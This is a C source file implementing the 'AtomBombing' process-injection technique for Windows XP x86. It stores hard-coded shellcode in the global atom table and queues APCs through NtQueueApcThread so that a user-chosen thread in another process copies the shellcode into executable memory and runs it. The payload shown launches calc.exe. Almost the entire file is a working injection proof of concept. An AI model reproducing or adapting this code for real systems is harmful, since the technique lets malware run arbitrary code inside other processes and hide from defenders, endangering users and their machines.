#include <stdio.h>
#include <Windows.h>

#ifndef _USING_v110_SDK71_
#error "Supported toolset is v141_xp"
#endif

#pragma warning (disable : 4996)

#define RTL_MAXIMUM_ATOM_LENGTH 255

typedef DWORD(NTAPI *_NtQueueApcThread) (
    HANDLE ThreadHandle,
    PAPCFUNC ApcRoutine,
    OPTIONAL    PVOID ApcRoutineContext,    /* ActivationContext */
    OPTIONAL    PVOID ApcStatusBlock,
    OPTIONAL    ULONG ApcReserved
);

/* WinXP x86 launch calc.exe */
BYTE payload[] =    "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x13\x53\xbb\xad\x23\x86\x7c"
                    "\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff"
                    "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61\x6c\x63\x2e\x65"
                    "\x78\x65\x90";

#ifdef VERIFY_PAYLOAD
int verify_payload(HANDLE hproc, void *target_memory, const size_t payloadsz) {
    if (NULL == target_memory) {
        return EXIT_FAILURE;
    }

    SIZE_T readsz = 0;
    BYTE *procmem = VirtualAlloc(NULL, payloadsz, MEM_COMMIT, PAGE_READWRITE);
    if (NULL == procmem) {
        fprintf(stderr, "[-] Unable to allocate memory - E%d\n", GetLastError());
        return EXIT_FAILURE;
    }

    if (!ReadProcessMemory(hproc, target_memory, procmem, payloadsz, &readsz)) {
        fprintf(stderr, "[-] Unable to read process memory - E%d\n", GetLastError());
        return EXIT_FAILURE;
    }

    for (size_t i = 0; i < payloadsz; i++) {
        if (procmem[i] != payload[i]) {
            fprintf(
                stderr,
                "[-] Payload was not copied! Mismatch index: %zu [0x%02x != 0x%02x]\n",
                i, procmem[i], payload[i]
            );
            return EXIT_FAILURE;
        }
    }
    puts("[+] Payload verified!");
    return EXIT_SUCCESS;
}
#endif

int main(void) {
    DWORD pid, tid;
    HANDLE ntdll = GetModuleHandleA("ntdll.dll");

    char inputbuf[8] = { 0 };

    if (NULL == ntdll) {
        fprintf(stderr, "[-] Unable to get handle to ntdll.dll - E%d\n", GetLastError());
        return EXIT_FAILURE;
    }

    /* GlobalAddAtomA() may fail with ERROR_ACCESS_DENIED without loading user32.dll */
    if (NULL == LoadLibraryA("User32")) {
        fprintf(stderr, "[-] Unable to load User32.dll - E%d\n", GetLastError());
        return EXIT_FAILURE;
    }

    _NtQueueApcThread NtQueueApcThread = (_NtQueueApcThread) GetProcAddress(ntdll, "NtQueueApcThread");
    if (NULL == (void *) NtQueueApcThread) {
        fprintf(stderr, "[-] Cannot export NtQueueApcThread() - E%d\n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[+] NtQueueUserAPC => 0x%p\n", (void *) NtQueueApcThread);

    printf("[*] Enter target process ID: ");
    fflush(stdout);
    fgets(inputbuf, sizeof(inputbuf), stdin);

    pid = atoi(inputbuf);
    memset(inputbuf, 0, sizeof(inputbuf));

    printf("[*] Enter target thread ID: ");
    fflush(stdout);
    fgets(inputbuf, sizeof(inputbuf), stdin);

    tid = atoi(inputbuf);

#ifdef VERIFY_PAYLOAD
    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
#else
    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
#endif
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
    if (NULL == hThread || NULL == hProcess) {
        fprintf(stderr, "[-] Unable to open thread ID %ld from process ID %ld - E%ld\n", tid, pid, GetLastError());
        return EXIT_FAILURE;
    }

    void *pmem = VirtualAllocEx(hProcess, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (NULL == pmem) {
        fprintf(stderr, "[-] Unable to allocate memory - E%d\n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[+] Allocated memory at 0x%p\n", pmem);

    ATOM atom = GlobalAddAtomA(payload);
    if (0 == atom) {
        fprintf(stderr, "[-] Unable to create atom - E%ld\n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[+] Atom value = %hu (0x%hx)\nPress ENTER to bomb..\n", atom, atom);
    char c = getchar();

    puts("[+] Pushing payload..");
    NtQueueApcThread(hThread, (PAPCFUNC) GlobalGetAtomNameA, (PVOID) atom, pmem, sizeof(payload));

#ifdef VERIFY_PAYLOAD
    puts("[+] Verifying payload..");
    if (EXIT_SUCCESS != verify_payload(hProcess, pmem, sizeof(payload))) {
        system("pause");
        return EXIT_FAILURE;
    }
#endif
    puts("[+] Invoking payload..");
    NtQueueApcThread(hThread, pmem, NULL, NULL, 0);

    WaitForSingleObject(hThread, INFINITE);

    system("pause");
    return EXIT_SUCCESS;
}
